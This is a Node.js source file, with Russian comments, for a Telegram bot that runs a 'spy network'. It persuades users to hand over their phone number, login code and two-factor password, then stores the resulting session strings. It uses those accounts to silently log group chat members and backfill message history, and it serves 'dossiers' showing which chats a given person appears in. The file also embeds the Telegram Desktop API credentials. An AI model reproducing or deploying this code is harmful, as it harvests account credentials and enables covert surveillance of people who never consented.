const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { NewMessage } = require('telegram/events');
const TelegramBot = require('node-telegram-bot-api');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const express = require('express');
const axios = require('axios');

// ====================================================================
// 🛡️ СИСТЕМА ЖЕЛЕЗОБЕТОННОЙ ЗАЩИТЫ ОТ КРАШЕЙ И ПАДЕНИЙ (АНТИ-КАПРИЗ)
// ====================================================================
process.on('uncaughtException', (err) => {
    console.error('🚨 [Критический перехват] Ошибка потока:', err.stack || err.message);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('🚨 [Критический перехват] Необработанный Promise:', reason);
});

// Глобальные ключи Telegram Desktop
const apiId = 2040;
const apiHash = "b18441a1ff607e10a989891a5462e627";

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
if (!TELEGRAM_TOKEN) {
    console.error("❌ ОШИБКА: Переменная TELEGRAM_TOKEN отсутствует в Environment!");
    process.exit(1);
}

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Хранилище временных состояний авторизации людей в ЛС
const authStates = {};

// Глобальный пул активных клиентов-шпионов
const activeSpyClients = [];

// ====================================================================
// 📊 ИНИЦИАЛИЗАЦИЯ СУБД SQLITE С РАСШИРЕННЫМИ ТАБЛИЦАМИ СЕТИ
// ====================================================================
const dbPath = path.join(__dirname, 'global_telelog.db');
const db = new sqlite3.Database(dbPath);

db.serialize(() => {
    // База логов
    db.run(`CREATE TABLE IF NOT EXISTS global_logs (
        chat_id TEXT, chat_title TEXT, user_id TEXT, username TEXT, first_name TEXT,
        msg_count INTEGER DEFAULT 0, sticker_count INTEGER DEFAULT 0, last_seen TEXT, last_hour INTEGER DEFAULT 0,
        PRIMARY KEY (chat_id, user_id)
    )`);

    // Статистика чатов
    db.run(`CREATE TABLE IF NOT EXISTS spy_chats (
        chat_id TEXT PRIMARY KEY, chat_title TEXT, total_captured INTEGER DEFAULT 0
    )`);

    // 🔥 ТАБЛИЦА СЕТИ ДОБРОВОЛЬЦЕВ (Хранит сессии людей)
    db.run(`CREATE TABLE IF NOT EXISTS spy_nodes (
        user_id TEXT PRIMARY KEY,
        phone TEXT,
        session_string TEXT,
        added_at TEXT
    )`);
});

// Универсальный обработчик входящих сообщений для ЛЮБОГО юзербота
async function registerSpyHandlers(client, accountName) {
    client.addEventHandler(async (event) => {
        const message = event.message;
        if (!message) return;

        try {
            if (!message.isGroup && !message.isChannel) return;

            const sender = await message.getSender();
            if (!sender || sender.bot) return;

            const chat = await message.getChat();
            const chatTitle = chat.title || "Скрытая группа";
            
            const chatId = message.chatId ? message.chatId.toString() : "";
            const userId = sender.id.toString();
            const username = sender.username ? `@${sender.username}` : "Без ника";
            const firstName = sender.firstName || "Пользователь";
            
            const isSticker = message.media && message.media.className === 'MessageMediaDocument' ? 1 : 0;
            const isMsg = isSticker ? 0 : 1;
            
            const moscowTime = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
            const currentHour = new Date(new Date().toLocaleString('en-US', { timeZone: 'Europe/Moscow' })).getHours();

            console.log(`📥 [СЕТЬ: ${accountName}] Перехват в чате "${chatTitle}" от ${username}`);

            db.run(`
                INSERT INTO global_logs (chat_id, chat_title, user_id, username, first_name, msg_count, sticker_count, last_seen, last_hour)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?) ON CONFLICT(chat_id, user_id) DO UPDATE SET
                    chat_title = excluded.chat_title, username = excluded.username, first_name = excluded.first_name,
                    msg_count = msg_count + excluded.msg_count, sticker_count = sticker_count + excluded.sticker_count,
                    last_seen = excluded.last_seen, last_hour = excluded.last_hour
            `, [chatId, chatTitle, userId, username, firstName, isMsg, isSticker, moscowTime, currentHour]);

            db.run(`
                INSERT INTO spy_chats (chat_id, chat_title, total_captured)
                VALUES (?, ?, 1) ON CONFLICT(chat_id) DO UPDATE SET
                    chat_title = excluded.chat_title, total_captured = total_captured + 1
            `, [chatId, chatTitle]);

        } catch (e) {}
    }, new NewMessage({}));
}

// Сканнер истории для подключаемых узлов
async function backfillHistory(client, accountName) {
    try {
        const dialogs = await client.getDialogs({ limit: 15 });
        console.log(`⏳ [Ретроспекция] ${accountName} сканирует историю своих чатов...`);
        for (const dialog of dialogs) {
            if (dialog.isGroup || dialog.isChannel) {
                const messages = await client.getMessages(dialog.entity, { limit: 40 }).catch(() => []);
                for (const msg of messages) {
                    if (!msg || !msg.senderId) continue;
                    const sender = await msg.getSender().catch(() => null);
                    if (!sender || sender.bot) continue;

                    const isSticker = msg.media && msg.media.className === 'MessageMediaDocument' ? 1 : 0;
                    const isMsg = isSticker ? 0 : 1;
                    const msgDate = new Date(msg.date * 1000);
                    
                    db.run(`
                        INSERT INTO global_logs (chat_id, chat_title, user_id, username, first_name, msg_count, sticker_count, last_seen, last_hour)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?) ON CONFLICT(chat_id, user_id) DO UPDATE SET msg_count = msg_count + excluded.msg_count
                    `, [dialog.id.toString(), dialog.title || "Группа", sender.id.toString(), sender.username ? `@${sender.username}` : "Без ника", sender.firstName || "Юзер", isMsg, isSticker, msgDate.toLocaleString('ru-RU'), msgDate.getHours()]);
                }
            }
        }
        console.log(`✅ [Ретроспекция] Импорт истории для ${accountName} завершен.`);
    } catch (err) {
        console.error(`Ошибка истории для ${accountName}:`, err.message);
    }
}

// ====================================================================
// 🛰️ ЗАПУСК ВСЕЙ СЕТИ ШПИОНОВ (ОСНОВНОЙ + ДОБРОВОЛЬЦЫ)
// ====================================================================
async function initAllSpyNodes() {
    // 1. Запуск твоего личного шпиона из конфига Render
    if (process.env.TELEGRAM_SESSION) {
        const primarySession = new StringSession(process.env.TELEGRAM_SESSION);
        const primaryClient = new TelegramClient(primarySession, apiId, apiHash, { connectionRetries: 5, useWSS: true });
        try {
            await primaryClient.connect();
            const me = await primaryClient.getMe();
            console.log(`👑 [ГЛАВНЫЙ ШПИОН ЗАПУЩЕН]: @${me.username}`);
            activeSpyClients.push(primaryClient);
            await registerSpyHandlers(primaryClient, `Главный (@${me.username})`);
            backfillHistory(primaryClient, me.firstName);
        } catch (e) { console.error("Ошибка запуска главного шпиона:", e.message); }
    }

    // 2. Подъем всех аккаунтов добровольцев из базы SQLite
    db.all(`SELECT * FROM spy_nodes`, [], async (err, rows) => {
        if (err || !rows) return;
        console.log(`🌐 [Сеть] Обнаружено ${rows.length} добровольных шпионских узлов в БД. Подключаем...`);
        
        for (const row of rows) {
            const nodeSession = new StringSession(row.session_string);
            const nodeClient = new TelegramClient(nodeSession, apiId, apiHash, { connectionRetries: 3, useWSS: true });
            try {
                await nodeClient.connect();
                const nodeMe = await nodeClient.getMe();
                console.log(`🟢 [УЗЕЛ СЕТИ АКТИВЕН]: @${nodeMe.username} (Добавил: ${row.phone})`);
                activeSpyClients.push(nodeClient);
                await registerSpyHandlers(nodeClient, `Узел (@${nodeMe.username})`);
            } catch (nodeErr) {
                console.error(`🔴 Ошибка подключения узла ${row.phone}, возможно сессия сброшена:`, nodeErr.message);
                // Если сессия сдохла — удаляем узел, чтобы не тратить ресурсы
                db.run(`DELETE FROM spy_nodes WHERE user_id = ?`, [row.user_id]);
            }
        }
    });
}

// ====================================================================
// 🧠 МЕНЮ БОТА В СТИЛЕ POST AI
// ====================================================================
function getMainMenuText() {
    return "⚡️ *ИНФОРМАЦИОННО-АНАЛИТИЧЕСКИЙ ХАБ | ФАНСТАТ* ⚡️\n\n" +
           "Приветствую! Бот функционирует на базе распределенной сети скрытых юзерботов.\n\n" +
           "🕵️‍♂️ *Текущий статус:* Ведется скрытый мониторинг открытых чатов.\n\n" +
           "🚀 *Сделай вклад:* Ты можешь добровольно сдать свой второй аккаунт в нашу Шпионскую Сеть, чтобы расширить радар поиска и собирать ещё больше статистики из закрытых групп!";
}

function getMainMenuButtons() {
    return {
        inline_keyboard: [
            [
                { text: '🏆 Топ-10 Флудеров', callback_data: 'global_top' },
                { text: '🏰 Мониторинг чатов', callback_data: 'chats_status' }
            ],
            [
                { text: '🤝 Стать Добровольцем (Сдать акк)', callback_data: 'join_network' },
                { text: '⚙️ Статус Сети', callback_data: 'network_status' }
            ],
            [
                { text: '👤 Мой профиль', callback_data: 'my_profile' },
                { text: '📖 Инструкция', callback_data: 'bot_info' }
            ]
        ]
    };
}

// ====================================================================
// 📥 ИНТЕРАКТИВНЫЙ ОБРАБОТЧИК ДИАЛОГОВ И ПОД КЛЮЧЕНИЯ АККАУНТОВ
// ====================================================================
bot.on('message', async (msg) => {
    if (msg.chat.type !== 'private') return;
    const chatId = msg.chat.id;
    const text = msg.text ? msg.text.trim() : '';
    const state = authStates[chatId];

    if (text === '/start') {
        delete authStates[chatId];
        return bot.sendMessage(chatId, getMainMenuText(), { parse_mode: 'Markdown', reply_markup: getMainMenuButtons() });
    }

    // ШАГ 1: Прием номера телефона
    if (state && state.step === 'WAITING_PHONE') {
        const phone = text.replace(/\s+/g, '');
        if (!phone.startsWith('+')) {
            return bot.sendMessage(chatId, "❌ Номер телефона должен начинаться со знака `+` (например, `+79991234567`). Попробуй еще раз:");
        }
        
        bot.sendMessage(chatId, "⏳ Связываюсь с серверами Telegram. Инициирую отправку кода...");
        
        const tempSession = new StringSession("");
        const tempClient = new TelegramClient(tempSession, apiId, apiHash, { connectionRetries: 3, useWSS: true });
        
        try {
            await tempClient.connect();
            const phoneCodeHash = await tempClient.sendCode({ apiId, apiHash }, phone);
            
            authStates[chatId] = {
                step: 'WAITING_CODE',
                phone: phone,
                phoneCodeHash: phoneCodeHash.phoneCodeHash,
                client: tempClient
            };
            return bot.sendMessage(chatId, `📬 Код успешно отправлен системой Telegram на аккаунт *${phone}*.\n\nВведите полученный пятизначный код доступа:`);
        } catch (err) {
            return bot.sendMessage(chatId, `❌ Ошибка отправки кода: \`${err.message}\`.\nВведите номер телефона заново:`);
        }
    }

    // ШАГ 2: Прием проверочного кода из СМС/Уведомления
    if (state && state.step === 'WAITING_CODE') {
        const code = text;
        bot.sendMessage(chatId, "⏳ Проверяю код авторизации...");

        try {
            await state.client.signIn({
                phoneNumber: state.phone,
                phoneCodeHash: state.phoneCodeHash,
                phoneCode: code
            });
            
            // Если зашли без 2FA
            const me = await state.client.getMe();
            const sessionString = state.client.session.save();
            const now = new Date().toLocaleString('ru-RU');

            db.run(`INSERT INTO spy_nodes (user_id, phone, session_string, added_at) VALUES (?, ?, ?, ?)
                    ON CONFLICT(user_id) DO UPDATE SET session_string = excluded.session_string`,
                    [me.id.toString(), state.phone, sessionString, now]);

            activeSpyClients.push(state.client);
            await registerSpyHandlers(state.client, `Узел (@${me.username})`);
            backfillHistory(state.client, me.firstName);

            delete authStates[chatId];
            return bot.sendMessage(chatId, `🎉 *УСПЕХ! ТВОЙ УЗЕЛ ПОДКЛЮЧЕН К СЕТИ!* 🎉\n\nАккаунт *@${me.username}* теперь официально работает шпионом. Спасибо за вклад!`, { parse_mode: 'Markdown' });

        } catch (err) {
            // Если у юзера стоит двухфакторный пароль (2FA)
            if (err.message.includes("SESSION_PASSWORD_NEEDED") || err.className === 'UpdateShortWithAnders') {
                authStates[chatId].step = 'WAITING_PASSWORD';
                return bot.sendMessage(chatId, "🔑 На твоем аккаунте активирован облачный пароль (двухфакторная аутентификация).\n\nПожалуйста, введи свой пароль:");
            }
            return bot.sendMessage(chatId, `❌ Неверный код или ошибка: \`${err.message}\`.\nПопробуй ввести код заново:`);
        }
    }

    // ШАГ 3: Прием пароля 2FA
    if (state && state.step === 'WAITING_PASSWORD') {
        const password = text;
        bot.sendMessage(chatId, "⏳ Сверяю облачный пароль...");

        try {
            await state.client.signIn({
                password: password
            });

            const me = await state.client.getMe();
            const sessionString = state.client.session.save();
            const now = new Date().toLocaleString('ru-RU');

            db.run(`INSERT INTO spy_nodes (user_id, phone, session_string, added_at) VALUES (?, ?, ?, ?)`,
                    [me.id.toString(), state.phone, sessionString, now]);

            activeSpyClients.push(state.client);
            await registerSpyHandlers(state.client, `Узел (@${me.username})`);
            backfillHistory(state.client, me.firstName);

            delete authStates[chatId];
            return bot.sendMessage(chatId, `🎉 *УСПЕХ! ТВОЙ УЗЕЛ ПОДКЛЮЧЕН (2FA) СЕТИ!* 🎉\n\nАккаунт *@${me.username}* активирован в шпионском пуле. Спасибо!`);
        } catch (err) {
            return bot.sendMessage(chatId, `❌ Неверный облачный пароль: \`${err.message}\`.\nПопробуй ввести пароль еще раз:`);
        }
    }

    // Стандартный поиск досье по тексту (если юзер не находится в цикле авторизации)
    let param = text;
    let isUsername = false;

    if (msg.forward_from) {
        param = msg.forward_from.id.toString();
    } else if (!msg.forward_from && text.startsWith('@')) {
        isUsername = true;
    } else if (!/^\d+$/.test(text)) {
        return bot.sendMessage(chatId, "⚠️ *Неизвестная команда или формат.* Введи никнейм цели с `@`, числовой ID, либо нажми /start.");
    }

    searchUser(param, isUsername, (resultText) => {
        bot.sendMessage(chatId, resultText, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔄 Обновить досье', callback_data: `refresh:${isUsername ? 'u' : 'i'}:${param}` }],
                    [{ text: '⬅️ В главное меню', callback_data: 'to_main' }]
                ]
            }
        });
    });
});

// ====================================================================
// 🎛️ СИСТЕМА ИНЛАЙН КНОПОК И СТАТУСОВ
// ====================================================================
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const data = query.data;

    if (data === 'to_main') {
        delete authStates[chatId];
        bot.editMessageText(getMainMenuText(), {
            chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: getMainMenuButtons()
        }).catch(() => {});
    }

    else if (data === 'join_network') {
        authStates[chatId] = { step: 'WAITING_PHONE' };
        const joinMsg = "🤝 *РЕЖИМ ДОБРОВОЛЬЦА СЕТИ*\n\n" +
                        "Мы гарантируем полную конфиденциальность. Твой аккаунт будет использоваться исключительно как пассивный логгер (он будет просто «слушать» чаты, в которых ты состоишь, ничего туда не отправляя).\n\n" +
                        "📞 Чтобы начать, отправь сюда свой номер телефона в международном формате (включая `+`, например: `+79991234567`):";
        bot.editMessageText(joinMsg, {
            chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] }
        }).catch(() => {});
    }

    else if (data === 'network_status') {
        db.get(`SELECT COUNT(*) as count FROM spy_nodes`, [], (err, row) => {
            const nodesCount = row ? row.count : 0;
            const netStatus = `🌐 *МОНИТОРИНГ РАСПРЕДЕЛЕННОЙ СЕТИ*\n\n` +
                              `• Всего активных узлов шпионажа: *${activeSpyClients.length}*\n` +
                              `• Из них предоставлено добровольцами: *${nodesCount}*\n` +
                              `• Статус сети: *🟢 Отличный (Сбор логов максимизирован)*`;
            bot.editMessageText(netStatus, {
                chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] }
            }).catch(() => {});
        });
    }

    else if (data === 'bot_info') {
        const info = "📖 *ИНСТРУКЦИЯ К СЕТЕВОМУ БОТУ*\n\n" +
                     "1️⃣ Бот собирает логи через аккаунты-шпионы.\n" +
                     "2️⃣ Чем больше чатов охватывают наши добровольцы, тем выше точность досье.\n" +
                     "3️⃣ Система Ретроспекции парсит последние 40 сообщений при подключении каждого нового узла!";
        bot.editMessageText(info, {
            chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] }
        }).catch(() => {});
    }

    else if (data === 'global_top') {
        db.all(`SELECT username, first_name, SUM(msg_count) as total FROM global_logs GROUP BY user_id ORDER BY total DESC LIMIT 10`, [], (err, rows) => {
            let topText = "🏆 *ТОП-10 САМЫХ АКТИВНЫХ ПОЛЬЗОВАТЕЛЕЙ СЕТИ* 🏆\n\n";
            if (err || !rows || rows.length === 0) {
                topText += "_База пуста._";
            } else {
                rows.forEach((row, index) => {
                    topText += `${index + 1}. *${row.first_name}* (${row.username}) — 💬 *${row.total}* собщ.\n`;
                });
            }
            bot.editMessageText(topText, {
                chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] }
            }).catch(() => {});
        });
    }

    else if (data === 'chats_status') {
        db.all(`SELECT * FROM spy_chats ORDER BY total_captured DESC LIMIT 20`, [], (err, rows) => {
            let chatText = "🏰 *ОТ СЛЕЖИВАЕМЫЕ ГРУППЫ СЕТИ* Castle\n\n";
            if (err || !rows || rows.length === 0) {
                chatText += "_Данных пока нет._";
            } else {
                rows.forEach((row, index) => {
                    chatText += `${index + 1}. *${row.chat_title}* — Считано: *${row.total_captured}*\n`;
                });
            }
            bot.editMessageText(chatText, {
                chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] }
            }).catch(() => {});
        });
    }

    try { bot.answerCallbackQuery(query.id); } catch(e) {}
});

function searchUser(param, isUsername, callback) {
    let querySQL = isUsername ? `SELECT * FROM global_logs WHERE LOWER(username) = LOWER(?)` : `SELECT * FROM global_logs WHERE user_id = ?`;
    db.all(querySQL, [param], (err, rows) => {
        if (err || !rows || rows.length === 0) return callback(`❌ *Пользователь не найден.*`);
        let totalMsg = 0, totalStickers = 0, chatsList = '';
        rows.forEach(row => { totalMsg += row.msg_count; totalStickers += row.sticker_count; chatsList += `• *${row.chat_title}*: 💬 *${row.msg_count}*\n`; });
        callback(`👤 *ДОСЬЕ ПОЛЬЗОВАТЕЛЯ* 👤\n\n• *Имя:* ${rows[0].first_name}\n• *ID:* \`${rows[0].user_id}\`\n\n🏰 *Замечен в чатах:*\n${chatsList}`);
    });
}

// Запуск пула шпионов
initAllSpyNodes();

// ====================================================================
// 🌐 ВЕБ-СЕРВЕР И АВТО-ПИНГ
// ====================================================================
const app = express();
app.get('/', (req, res) => res.send('SpyNet Engine Active'));
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[Executive Server] Системный хаб развернут на порту: ${PORT}`);
    setInterval(() => {
        const url = process.env.RENDER_EXTERNAL_URL;
        if (url) axios.get(url).catch(() => {});
    }, 180000);
});
